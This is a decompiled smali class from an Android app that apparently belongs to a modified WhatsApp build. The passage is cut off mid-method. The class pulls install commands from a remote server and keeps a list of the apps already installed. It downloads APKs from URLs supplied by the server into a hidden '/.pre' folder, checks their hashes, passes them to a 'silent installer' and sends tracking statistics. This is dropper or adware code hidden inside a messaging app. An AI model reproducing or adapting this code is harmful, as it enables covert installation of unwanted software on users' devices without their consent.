.class public Lcow/silence/SilenceInstallManager;
.super Ljava/lang/Object;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcow/silence/SilenceInstallManager$DownloadListener;,
        Lcow/silence/SilenceInstallManager$InstanceHolder;
    }
.end annotation


# static fields
.field private static final DEFAULT_FILE_CACHE_PATH:Ljava/lang/String; = "/.pre"

.field public static final TAG:Ljava/lang/String; = "SilenceInstall"


# instance fields
.field private currentDownload:Lcow/silence/entity/SilenceInstallDownloadInfo;

.field private dir:Ljava/io/File;

.field private final installedAppList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Landroid/content/pm/PackageInfo;",
            ">;"
        }
    .end annotation
.end field

.field private final mDownloadListener:Lcow/silence/SilenceInstallManager$DownloadListener;

.field private volatile requesting:Z

.field private final waitingQueue:Ljava/util/LinkedList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedList<",
            "Lcow/silence/entity/PresetCommand;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method private constructor <init>()V
    .locals 4

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    iput-object v0, p0, Lcow/silence/SilenceInstallManager;->waitingQueue:Ljava/util/LinkedList;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcow/silence/SilenceInstallManager;->requesting:Z

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcow/silence/SilenceInstallManager;->installedAppList:Ljava/util/List;

    new-instance v0, Lcow/silence/SilenceInstallManager$DownloadListener;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcow/silence/SilenceInstallManager$DownloadListener;-><init>(Lcow/silence/SilenceInstallManager;Lcow/silence/SilenceInstallManager$1;)V

    iput-object v0, p0, Lcow/silence/SilenceInstallManager;->mDownloadListener:Lcow/silence/SilenceInstallManager$DownloadListener;

    sget-object v1, Lcow/silence/utils/AdDownloadManager;->INSTANCE:Lcow/silence/utils/AdDownloadManager;

    invoke-virtual {v1, v0}, Lcow/silence/utils/AdDownloadManager;->addDownloadListener(Lcow/silence/utils/AdDownloadListener;)V

    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v2, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/gbwhatsapp/yo/yo;->pname:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/.pre"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcow/silence/SilenceInstallManager;->dir:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcow/silence/SilenceInstallManager;->dir:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    :cond_0
    invoke-direct {p0}, Lcow/silence/SilenceInstallManager;->initInstalledAppList()V

    return-void
.end method

.method public synthetic constructor <init>(Lcow/silence/SilenceInstallManager$1;)V
    .locals 0

    invoke-direct {p0}, Lcow/silence/SilenceInstallManager;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcow/silence/SilenceInstallManager;)V
    .locals 0

    invoke-direct {p0}, Lcow/silence/SilenceInstallManager;->lambda$initInstalledAppList$0()V

    return-void
.end method

.method public static synthetic access$1000(Lcow/silence/SilenceInstallManager;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 0

    invoke-direct {p0, p1, p2}, Lcow/silence/SilenceInstallManager;->checkFileValid(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p0

    return p0
.end method

.method public static synthetic access$1100(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V
    .locals 0

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager;->reportSuccess(Lcow/silence/entity/PresetCommand;)V

    return-void
.end method

.method public static synthetic access$300(Lcow/silence/SilenceInstallManager;)Ljava/util/List;
    .locals 0

    invoke-direct {p0}, Lcow/silence/SilenceInstallManager;->request()Ljava/util/List;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic access$400(Lcow/silence/SilenceInstallManager;)Ljava/util/LinkedList;
    .locals 0

    iget-object p0, p0, Lcow/silence/SilenceInstallManager;->waitingQueue:Ljava/util/LinkedList;

    return-object p0
.end method

.method public static synthetic access$500(Lcow/silence/SilenceInstallManager;)Ljava/util/List;
    .locals 0

    iget-object p0, p0, Lcow/silence/SilenceInstallManager;->installedAppList:Ljava/util/List;

    return-object p0
.end method

.method public static synthetic access$600(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V
    .locals 0

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager;->executeDownload(Lcow/silence/entity/PresetCommand;)V

    return-void
.end method

.method public static synthetic access$702(Lcow/silence/SilenceInstallManager;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcow/silence/SilenceInstallManager;->requesting:Z

    return p1
.end method

.method public static synthetic access$800(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V
    .locals 0

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager;->download(Lcow/silence/entity/PresetCommand;)V

    return-void
.end method

.method public static synthetic access$900(Lcow/silence/SilenceInstallManager;)Lcow/silence/entity/SilenceInstallDownloadInfo;
    .locals 0

    iget-object p0, p0, Lcow/silence/SilenceInstallManager;->currentDownload:Lcow/silence/entity/SilenceInstallDownloadInfo;

    return-object p0
.end method

.method private checkFileValid(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 8

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    return v1

    :cond_0
    invoke-static {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object p1

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result v0

    if-nez v0, :cond_1

    return v1

    :cond_1
    const-string v0, ""

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->isDirectory()Z

    move-result v2

    const-string v3, "/base.apk"

    const-string v4, "SilenceInstall"

    if-eqz v2, :cond_2

    const-string v2, "is directory"

    invoke-static {v4, v2}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object p1

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result v2

    if-eqz v2, :cond_5

    goto :goto_0

    :cond_2
    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    const-string v5, ".apk"

    invoke-virtual {v2, v5}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    const-string v0, "apk file"

    invoke-static {v4, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    invoke-static {p1}, Lcom/github/base/core/utils/algo/HashUtils;->hashToStringEx(Lcom/github/base/core/utils/io/sfile/SFile;)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_3
    const-string v5, ".sapk"

    invoke-virtual {v2, v5}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_5

    const-string v5, "sapk file"

    invoke-static {v4, v5}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->getParent()Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object v5

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v5, v2}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Lcom/github/base/core/utils/io/sfile/SFile;Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object v2

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Lcom/github/base/core/utils/io/sfile/SFile;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object v5

    invoke-virtual {v2}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result v6

    if-eqz v6, :cond_4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Lcom/github/base/core/utils/io/sfile/SFile;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object v3

    invoke-virtual {v3}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result v3

    if-eqz v3, :cond_4

    :goto_1
    invoke-static {v5}, Lcom/github/base/core/utils/algo/HashUtils;->hashToStringEx(Lcom/github/base/core/utils/io/sfile/SFile;)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_4
    invoke-static {p1, v2}, Lcow/silence/utils/FileUtils;->extractBundleApp(Lcom/github/base/core/utils/io/sfile/SFile;Lcom/github/base/core/utils/io/sfile/SFile;)Z

    move-result p1

    if-eqz p1, :cond_5

    invoke-virtual {v5}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result p1

    if-eqz p1, :cond_5

    goto :goto_1

    :cond_5
    :goto_2
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "real_md5--->"

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v4, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "pkg_md5--->"

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v4, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_6

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    const/4 v1, 0x1

    :cond_6
    return v1
.end method

.method private deleteItem(Lcow/silence/entity/PresetCommand;Ljava/lang/String;)V
    .locals 2

    const-string v0, "SDK_PR_Deletepackage"

    invoke-static {p1, v0, p2}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object p2

    invoke-static {p2}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object p2

    iget-wide v0, p1, Lcow/silence/entity/PresetCommand;->mUid:J

    invoke-virtual {p2, v0, v1}, Lcow/silence/database/SilenceInstallDataBase;->deleteCommand(J)V

    iget-object p2, p1, Lcow/silence/entity/PresetCommand;->mApkPath:Ljava/lang/String;

    invoke-static {p2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_0

    iget-object p1, p1, Lcow/silence/entity/PresetCommand;->mApkPath:Ljava/lang/String;

    invoke-static {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->create(Ljava/lang/String;)Lcom/github/base/core/utils/io/sfile/SFile;

    move-result-object p1

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->exists()Z

    move-result p2

    if-eqz p2, :cond_0

    invoke-virtual {p1}, Lcom/github/base/core/utils/io/sfile/SFile;->delete()Z

    :cond_0
    return-void
.end method

.method private declared-synchronized download(Lcow/silence/entity/PresetCommand;)V
    .locals 5

    monitor-enter p0

    :try_start_0
    const-string v0, "SilenceInstall"

    const-string v1, "start download "

    invoke-static {v0, v1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Lcow/silence/entity/SilenceInstallDownloadInfo;

    invoke-direct {v0}, Lcow/silence/entity/SilenceInstallDownloadInfo;-><init>()V

    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Lcow/silence/entity/SilenceInstallDownloadInfo;->setState(I)V

    iget-object v1, p1, Lcow/silence/entity/PresetCommand;->mDownloadUrl:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcow/silence/entity/SilenceInstallDownloadInfo;->setDownloadUrl(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Lcow/silence/entity/SilenceInstallDownloadInfo;->setPresetCommand(Lcow/silence/entity/PresetCommand;)V

    iput-object v0, p0, Lcow/silence/SilenceInstallManager;->currentDownload:Lcow/silence/entity/SilenceInstallDownloadInfo;

    new-instance v0, Lcow/silence/utils/AdDownloadParams;

    invoke-direct {v0}, Lcow/silence/utils/AdDownloadParams;-><init>()V

    iget-object v1, p1, Lcow/silence/entity/PresetCommand;->mDownloadUrl:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setDownloadUrl(Ljava/lang/String;)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setAutoStart(Z)V

    iget-object v1, p1, Lcow/silence/entity/PresetCommand;->mPkgName:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setPkgName(Ljava/lang/String;)V

    const-string v1, "silence_install"

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setPortal(Ljava/lang/String;)V

    iget-object v1, p1, Lcow/silence/entity/PresetCommand;->mTrackUrl:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setTrackUrl(Ljava/lang/String;)V

    iget v1, p1, Lcow/silence/entity/PresetCommand;->versionCode:I

    invoke-virtual {v0, v1}, Lcow/silence/utils/AdDownloadParams;->setVersionCode(I)V

    new-instance v1, Ljava/lang/StringBuilder;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcow/silence/SilenceInstallManager;->dir:Ljava/io/File;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p1, Lcow/silence/entity/PresetCommand;->apkType:Ljava/lang/String;

    const-string v3, "apk"

    invoke-static {v2, v3}, Landroid/text/TextUtils;->equals(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "."

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p1, p1, Lcow/silence/entity/PresetCommand;->apkType:Ljava/lang/String;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lcow/silence/utils/AdDownloadParams;->setFilePath(Ljava/lang/String;)V

    sget-object p1, Lcow/silence/utils/AdDownloadManager;->INSTANCE:Lcow/silence/utils/AdDownloadManager;

    invoke-virtual {p1, v0}, Lcow/silence/utils/AdDownloadManager;->unifiedDownloadForDune(Lcow/silence/utils/AdDownloadParams;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit p0

    return-void

    :catchall_0
    move-exception p1

    monitor-exit p0

    throw p1
.end method

.method private executeDownload(Lcow/silence/entity/PresetCommand;)V
    .locals 2

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager;->netPermit(Lcow/silence/entity/PresetCommand;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string p1, "SilenceInstall"

    const-string v0, "\u7f51\u7edc\u6761\u4ef6\u4e0d\u7b26\u5408"

    invoke-static {p1, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lcow/silence/SilenceInstallManager;->waitingQueue:Ljava/util/LinkedList;

    invoke-virtual {p1}, Ljava/util/LinkedList;->size()I

    move-result p1

    if-lez p1, :cond_0

    iget-object p1, p0, Lcow/silence/SilenceInstallManager;->waitingQueue:Ljava/util/LinkedList;

    invoke-virtual {p1}, Ljava/util/LinkedList;->pop()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Lcow/silence/entity/PresetCommand;

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager;->executeDownload(Lcow/silence/entity/PresetCommand;)V

    :cond_0
    return-void

    :cond_1
    new-instance v0, Lcow/silence/SilenceInstallManager$2;

    const-string v1, "FileDownloadCmdHandler"

    invoke-direct {v0, p0, v1, p1}, Lcow/silence/SilenceInstallManager$2;-><init>(Lcow/silence/SilenceInstallManager;Ljava/lang/String;Lcow/silence/entity/PresetCommand;)V

    invoke-static {v0}, Lcom/github/base/core/thread/TaskHelper;->execZForSDK(Lcom/github/base/core/thread/TaskHelper$RunnableWithName;)V

    return-void
.end method

.method public static getInstance()Lcow/silence/SilenceInstallManager;
    .locals 1

    invoke-static {}, Lcow/silence/SilenceInstallManager$InstanceHolder;->access$200()Lcow/silence/SilenceInstallManager;

    move-result-object v0

    return-object v0
.end method

.method private initInstalledAppList()V
    .locals 1

    new-instance v0, Lcow/silence/a;

    invoke-direct {v0, p0}, Lcow/silence/a;-><init>(Lcow/silence/SilenceInstallManager;)V

    invoke-static {v0}, Lcom/github/base/core/thread/TaskHelper;->exec(Ljava/lang/Runnable;)V

    return-void
.end method

.method private install(Lcow/silence/entity/PresetCommand;Z)V
    .locals 2

    invoke-static {}, Lcow/silence/installer/SilenceInstaller;->getInstance()Lcow/silence/installer/SilenceInstaller;

    move-result-object v0

    new-instance v1, Lcow/silence/SilenceInstallManager$3;

    invoke-direct {v1, p0, p2}, Lcow/silence/SilenceInstallManager$3;-><init>(Lcow/silence/SilenceInstallManager;Z)V

    invoke-virtual {v0, p1, v1, p2}, Lcow/silence/installer/SilenceInstaller;->install(Lcow/silence/entity/PresetCommand;Lcow/silence/api/SilenceInstallListener;Z)V

    return-void
.end method

.method private synthetic lambda$initInstalledAppList$0()V
    .locals 4

    iget-object v0, p0, Lcow/silence/SilenceInstallManager;->installedAppList:Ljava/util/List;

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x0

    const-string v3, ""

    invoke-static {v1, v2, v3}, Lcow/silence/utils/BasePackageUtils;->getInstalledPackages(Landroid/content/Context;ILjava/lang/String;)Ljava/util/List;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->addAll(Ljava/util/Collection;)Z

    return-void
.end method

.method private netPermit(Lcow/silence/entity/PresetCommand;)Z
    .locals 5

    iget-wide v0, p1, Lcow/silence/entity/PresetCommand;->mNetworkType:J

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {p1}, Lcom/github/base/core/net/NetUtils;->checkConnected(Landroid/content/Context;)Landroid/util/Pair;

    move-result-object p1

    const-wide/16 v2, 0x1

    cmp-long v4, v0, v2

    if-eqz v4, :cond_1

    iget-object p1, p1, Landroid/util/Pair;->second:Ljava/lang/Object;

    check-cast p1, Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_0

    const-wide/16 v2, 0x2

    cmp-long p1, v0, v2

    if-nez p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p1, 0x1

    :goto_1
    return p1
.end method

.method private reportSuccess(Lcow/silence/entity/PresetCommand;)V
    .locals 0

    return-void
.end method

.method private declared-synchronized request()Ljava/util/List;
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Lcow/silence/entity/PresetCommand;",
            ">;"
        }
    .end annotation

    monitor-enter p0

    :try_start_0
    invoke-static {}, Lcow/silence/net/SilenceInstallRequest;->request()Ljava/util/List;

    move-result-object v0

    const-string v1, "SilenceInstall"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "request success "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    const-wide/16 v1, 0x0

    if-eqz v0, :cond_8

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-nez v3, :cond_0

    goto/16 :goto_4

    :cond_0
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcow/silence/entity/PresetCommand;

    const-string v5, "SDK_PR_Downloadarrived"

    const-string v6, ""

    invoke-static {v4, v5, v6}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v5

    iget-wide v6, v4, Lcow/silence/entity/PresetCommand;->mUid:J

    invoke-virtual {v5, v6, v7}, Lcow/silence/database/SilenceInstallDataBase;->getCommandById(J)Lcow/silence/entity/PresetCommand;

    move-result-object v5

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-nez v5, :cond_1

    iput v7, v4, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    iput v6, v4, Lcow/silence/entity/PresetCommand;->retryCount:I

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v5

    :goto_1
    invoke-virtual {v5, v4}, Lcow/silence/database/SilenceInstallDataBase;->insertCommand(Lcow/silence/entity/PresetCommand;)J

    goto :goto_0

    :cond_1
    iget-object v8, v5, Lcow/silence/entity/PresetCommand;->mDownloadUrl:Ljava/lang/String;

    iget-object v9, v4, Lcow/silence/entity/PresetCommand;->mDownloadUrl:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_2

    iget v6, v5, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    iput v6, v4, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    iget-object v6, v5, Lcow/silence/entity/PresetCommand;->mApkPath:Ljava/lang/String;

    iput-object v6, v4, Lcow/silence/entity/PresetCommand;->mApkPath:Ljava/lang/String;

    iget-wide v6, v5, Lcow/silence/entity/PresetCommand;->installTime:J

    iput-wide v6, v4, Lcow/silence/entity/PresetCommand;->installTime:J

    iget v5, v5, Lcow/silence/entity/PresetCommand;->retryCount:I

    iput v5, v4, Lcow/silence/entity/PresetCommand;->retryCount:I

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v5

    invoke-virtual {v5, v4}, Lcow/silence/database/SilenceInstallDataBase;->updateCommand(Lcow/silence/entity/PresetCommand;)V

    goto :goto_0

    :cond_2
    const-string v5, "3"

    invoke-direct {p0, v4, v5}, Lcow/silence/SilenceInstallManager;->deleteItem(Lcow/silence/entity/PresetCommand;Ljava/lang/String;)V

    iput v7, v4, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    iput v6, v4, Lcow/silence/entity/PresetCommand;->retryCount:I

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v5

    goto :goto_1

    :cond_3
    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v3

    invoke-virtual {v3}, Lcow/silence/database/SilenceInstallDataBase;->listCommands()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_4
    :goto_2
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_7

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5
